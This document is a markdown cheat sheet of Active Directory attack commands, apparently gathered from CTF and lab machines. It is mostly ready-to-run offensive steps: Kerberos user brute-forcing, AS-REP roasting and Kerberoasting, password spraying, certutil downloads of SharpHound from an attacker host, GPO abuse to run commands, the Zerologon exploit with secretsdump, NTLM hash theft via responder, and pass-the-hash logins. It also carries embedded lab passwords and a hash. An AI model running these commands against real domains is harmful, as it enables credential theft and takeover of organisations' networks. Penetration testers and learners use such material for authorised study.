# Active Directory
* [No Credentials](#no-credentials)
  * [Initial Scans](#initial-scans)
  * [Brute Force](#brute-force)
    * [Password Generator](#password-generator)
* [Credentials](#credentials)
  * [Remote Login](#remote-login)
  * [User Scans](#user-scans)
  * [Local Scans](#local-scans)
    * [Get All Objects](#get-all-objects)
* [Exploits](#exploits)
  * [Zero Login](#zero-login)

## No Credentials
### Initial Scans
| Scan Type | Description | Command  |
| -------------------|-----------------------|:----------------------------------------------------------------------|
| LDAP   | Scan LDAP with nmap | `nmap -p 389 -sC -sV $ip` |
| LDAP  | Domain Enumeration | `ldapsearch -v -x -b "DC=hutch,DC=offsec" -H "ldap://$ip"` |
| LDAP  | Get User account description field | `ldapsearch -v -x -b "DC=hutch,DC=offsec" -H "ldap://$ip" \| grep description` |
| User Enumeration | Quick Bruteforce scan for valid usernames | `kerbrute -users /usr/share/seclists/Usernames/Names/names.txt -domain $domain -dc-ip $ip` |
| User Enumeration | Extensive Bruteforce scan for valid usernames | `kerbrute -users /usr/share/wordlists/names.txt -domain DICTIONARY -dc-ip $ip` |
| Get Hashes | list and get TGTs for those users without preauth set | `GetNPUsers.py brute.csl/ -usersfile users.txt -format john -outputfile hash` |
| Crack Hashes | Use John to crack hashes | `john hash --wordlist=/usr/share/wordlists/rockyou.txt ` |

### Brute Force
| Info | Command |
|:-----|:--------|
| WinRM User list & Password list | `crackmapexec winrm -u users.txt -p wordlist.txt -d $domain $ip` |
| SMB User list & Password list | `crackmapexec smb -u users.txt -p passwords.txt -d $domain $ip` |


#### Password Generator
```python
months = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'August', 'September', 'October', 'November', 'December']
years = ['2013', '2014', '2015', '2016', '2017', '2018', '2019', '2020', '2021']

with open('wordlist.txt', 'w') as wordlist:
    for month in months:
        for year in years:
            password = month + year
            wordlist.write(f'{password}\n')
```

`python3 generator.py`


## Credentials
### Remote Login
| Info | Command |
|:-----|:--------|
| RDP  | `remmina -c rdp://username@$ip` |
| WinRM User / Password | `evil-winrm -i $ip -u $user -p $pass` |
| WinRM User / Hash | `evil-winrm -i $ip -u $user -H $hash` |
| Psexec | `psexec.py $domain/$user@$ip` |
| RPC | `rpcclient -U $user $ip; enumdomusers` |
| SMB | `smbclient //$ip/$share -U "$user"` |
| SMB | `crackmapexec smb -u Potato -p 'W2CUvphqXB' --shares $ip`

### User Scans
| Info | Command |
|:-----|:--------|
| Enumerate other users | `rpcclient -U "izabel" $ip; enumdomusers` |
| Get User account with creds | `GetADUsers.py -all active.htb/svc_tgs -dc-ip $ip` |
| Download sharphound | `echo "certutil.exe -urlcache -f http://$lhost/windows/privesc/SharpHound.exe sharphound.exe" \| cb` |
| From Userlist (Check if preauthentication is enabled (If not we can steal hashes)) | `GetNPUsers.py $domain/ -no-pass -usersfile users.txt -request` |
| Bloodhound Python | `bloodhound-python -d megacorp.local -u sandra -p "Password1234!" -gc pathfinder.megacorp.local -c all -ns 10.10.10.30`

### SharpHound
| Info | Command |
|:-----|:--------|
| Download sharphound | `echo "certutil.exe -urlcache -f http://$lhost/windows/privesc/SharpHound.exe sharphound.exe" \| cb` |
| Download sharphound (Evil-WinRM) | `upload /root/share/windows/privesc/SharpHound.exe` |
| Start neo4j | `neo4j console` |
| Run Bloodhound | `bloodhound` |

### Remote Python Scan
```python
>>> import ldap3
>>> server = ldap3.Server('$ip', get_info = ldap3.ALL)
>>> connection = ldap3.Connection(server, user='Karen', password='MANAGER')
>>> connection.bind()
True
# Basic Server Info
>>> server.info
# All LDAP Entries
>>> connection.search(search_base='DC=toast,DC=csl', search_filter='(&(objectClass=*))', search_scope='SUBTREE', attributes='*')
>>> connection.entries
```

### Local Scans
#### Get All Objects
Code
```PowerShell
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = ($domainObj.PdcRoleOwner).Name
$SearchString = "LDAP://"
$SearchString += $PDC + "/"
$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
$SearchString += $DistinguishedName
$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
$objDomain = New-Object System.DirectoryServices.DirectoryEntry
$Searcher.SearchRoot = $objDomain
$Searcher.filter="samAccountType=805306368"
$Searcher.FindAll()
```

### Group Policies
| Info | Command |
|:-----|:--------|
| SharpGPO upload (Evil-WinRM) | `upload /root/share/windows/privesc/SharpGPOAbuse.exe` |
| SharpGPO upload (Evil-WinRM) | `upload /root/share/windows/privesc/CommandLine.dll` |
| SharpGPO payload | `.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Debug" --Author SPRAY\administrator --Command "cmd.exe" --Arguments "/c whoami > C:\task.txt" --GPOName "DCPolicy"` |
| Update group policy | `gpupdate /force` |
| Clean up | `New-GPOImmediateTask -Remove -Force -GPODisplayName DCPolicy`

## Exploits
### Zero Login
`python3 cve-2020-1472-exploit.py -t $ip -n ZERO-DC`

`secretsdump.py -no-pass -just-dc zero/'Zero-DC$'@172.31.1.29`

### NTLM Theft
`cd /opt/ntlm_theft`
`python3 /opt/ntlm_theft/ntlm_theft.py --generate all --server 10.10.0.15 --file test234`
`responder -I tun0`

## Steal Hashes


* Single Account (Check if we can get an account password to crack (ticket))
`python3 /opt/impacket/examples/GetNPUsers.py spookysec.local/svc-admin -no-pass`
* Enumerate shares with credentials
`smbmap -H spookysec.local -u svc-admin -p management2005 -d spookysec.local`

* Dump Secrets
`secretsdump.py -just-dc backup:backup2517860@spookysec.local`
* Pass the hash
`evil-winrm -i $ip -H 0e0363213e37b94221497260b0bcb4fc --user Administrator`
* Connect using evil-winrm and creds
`evil-winrm -i fusion.corp -u lparker -p '!!abbylvzsvs2k6!'`

# Kerberoast
GetUserSPNs.py -request -dc-ip $ip active.htb/svc_tgs

